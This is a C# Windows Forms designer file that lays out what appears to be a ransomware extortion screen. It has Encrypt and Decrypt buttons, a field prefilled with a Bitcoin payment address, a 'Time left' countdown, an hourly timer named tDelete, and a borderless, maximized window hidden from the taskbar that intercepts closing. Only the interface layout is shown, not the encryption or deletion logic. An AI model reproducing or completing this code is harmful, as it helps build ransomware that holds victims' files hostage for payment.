namespace TheWarehouse
{
    partial class Root
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.pctLogo = new System.Windows.Forms.PictureBox();
            this.wbInfo = new System.Windows.Forms.WebBrowser();
            this.btnEncrypt = new System.Windows.Forms.Button();
            this.btnDecrypt = new System.Windows.Forms.Button();
            this.txtBtcAddress = new System.Windows.Forms.TextBox();
            this.lblBtcAddress = new System.Windows.Forms.Label();
            this.lblTimeLeft = new System.Windows.Forms.Label();
            this.lblTime = new System.Windows.Forms.Label();
            this.tVisual = new System.Windows.Forms.Timer(this.components);
            this.tDelete = new System.Windows.Forms.Timer(this.components);
            this.lblAdmin = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.pctLogo)).BeginInit();
            this.SuspendLayout();
            // 
            // pctLogo
            // 
            this.pctLogo.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.pctLogo.Image = global::TheWarehouse.Properties.Resources.superlock;
            this.pctLogo.ImageLocation = "";
            this.pctLogo.InitialImage = null;
            this.pctLogo.Location = new System.Drawing.Point(12, 12);
            this.pctLogo.Name = "pctLogo";
            this.pctLogo.Size = new System.Drawing.Size(156, 161);
            this.pctLogo.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pctLogo.TabIndex = 0;
            this.pctLogo.TabStop = false;
            // 
            // wbInfo
            // 
            this.wbInfo.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.wbInfo.Location = new System.Drawing.Point(174, 12);
            this.wbInfo.MinimumSize = new System.Drawing.Size(20, 20);
            this.wbInfo.Name = "wbInfo";
            this.wbInfo.Size = new System.Drawing.Size(504, 324);
            this.wbInfo.TabIndex = 1;
            // 
            // btnEncrypt
            // 
            this.btnEncrypt.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnEncrypt.Location = new System.Drawing.Point(172, 395);
            this.btnEncrypt.Name = "btnEncrypt";
            this.btnEncrypt.Size = new System.Drawing.Size(75, 33);
            this.btnEncrypt.TabIndex = 2;
            this.btnEncrypt.Text = "Encrypt";
            this.btnEncrypt.UseVisualStyleBackColor = true;
            this.btnEncrypt.Click += new System.EventHandler(this.btnEncrypt_Click);
            // 
            // btnDecrypt
            // 
            this.btnDecrypt.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.btnDecrypt.Location = new System.Drawing.Point(253, 395);
            this.btnDecrypt.Name = "btnDecrypt";
            this.btnDecrypt.Size = new System.Drawing.Size(75, 33);
            this.btnDecrypt.TabIndex = 3;
            this.btnDecrypt.Text = "Decrypt";
            this.btnDecrypt.UseVisualStyleBackColor = true;
            this.btnDecrypt.Click += new System.EventHandler(this.btnDecrypt_Click);
            // 
            // txtBtcAddress
            // 
            this.txtBtcAddress.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.txtBtcAddress.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.txtBtcAddress.Location = new System.Drawing.Point(172, 362);
            this.txtBtcAddress.Multiline = true;
            this.txtBtcAddress.Name = "txtBtcAddress";
            this.txtBtcAddress.Size = new System.Drawing.Size(506, 27);
            this.txtBtcAddress.TabIndex = 4;
            this.txtBtcAddress.Text = "1F1tAaz5x1HUXrCNLbtMDqcw6o5GNn4xqX";
            // 
            // lblBtcAddress
            // 
            this.lblBtcAddress.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.lblBtcAddress.AutoSize = true;
            this.lblBtcAddress.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F);
            this.lblBtcAddress.Location = new System.Drawing.Point(168, 339);
            this.lblBtcAddress.Name = "lblBtcAddress";
            this.lblBtcAddress.Size = new System.Drawing.Size(107, 20);
            this.lblBtcAddress.TabIndex = 5;
            this.lblBtcAddress.Text = "BTC Address:";
            // 
            // lblTimeLeft
            // 
            this.lblTimeLeft.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.lblTimeLeft.AutoSize = true;
            this.lblTimeLeft.Font = new System.Drawing.Font("Microsoft Sans Serif", 16F);
            this.lblTimeLeft.Location = new System.Drawing.Point(40, 177);
            this.lblTimeLeft.Name = "lblTimeLeft";
            this.lblTimeLeft.Size = new System.Drawing.Size(101, 26);
            this.lblTimeLeft.TabIndex = 6;
            this.lblTimeLeft.Text = "Time left:";
            // 
            // lblTime
            // 
            this.lblTime.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.lblTime.AutoSize = true;
            this.lblTime.Font = new System.Drawing.Font("Microsoft Sans Serif", 21.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblTime.Location = new System.Drawing.Point(24, 201);
            this.lblTime.Name = "lblTime";
            this.lblTime.Size = new System.Drawing.Size(135, 33);
            this.lblTime.TabIndex = 7;
            this.lblTime.Text = "00:00:00";
            // 
            // tVisual
            // 
            this.tVisual.Interval = 1000;
            this.tVisual.Tick += new System.EventHandler(this.tVisual_Tick);
            // 
            // tDelete
            // 
            this.tDelete.Interval = 3600000;
            this.tDelete.Tick += new System.EventHandler(this.tDelete_Tick);
            // 
            // lblAdmin
            // 
            this.lblAdmin.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.lblAdmin.AutoSize = true;
            this.lblAdmin.Location = new System.Drawing.Point(617, 418);
            this.lblAdmin.Name = "lblAdmin";
            this.lblAdmin.Size = new System.Drawing.Size(47, 13);
            this.lblAdmin.TabIndex = 8;
            this.lblAdmin.Text = "Run as: ";
            // 
            // Root
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.Color.Maroon;
            this.ClientSize = new System.Drawing.Size(690, 440);
            this.Controls.Add(this.lblAdmin);
            this.Controls.Add(this.lblTime);
            this.Controls.Add(this.lblTimeLeft);
            this.Controls.Add(this.lblBtcAddress);
            this.Controls.Add(this.txtBtcAddress);
            this.Controls.Add(this.btnDecrypt);
            this.Controls.Add(this.btnEncrypt);
            this.Controls.Add(this.wbInfo);
            this.Controls.Add(this.pctLogo);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Root";
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "The Warehouse";
            this.WindowState = System.Windows.Forms.FormWindowState.Maximized;
            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Root_FormClosing);
            this.Load += new System.EventHandler(this.Root_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pctLogo)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.PictureBox pctLogo;
        private System.Windows.Forms.WebBrowser wbInfo;
        private System.Windows.Forms.Button btnEncrypt;
        private System.Windows.Forms.Button btnDecrypt;
        private System.Windows.Forms.TextBox txtBtcAddress;
        private System.Windows.Forms.Label lblBtcAddress;
        private System.Windows.Forms.Label lblTimeLeft;
        private System.Windows.Forms.Label lblTime;
        private System.Windows.Forms.Timer tVisual;
        private System.Windows.Forms.Timer tDelete;
        private System.Windows.Forms.Label lblAdmin;
    }
}

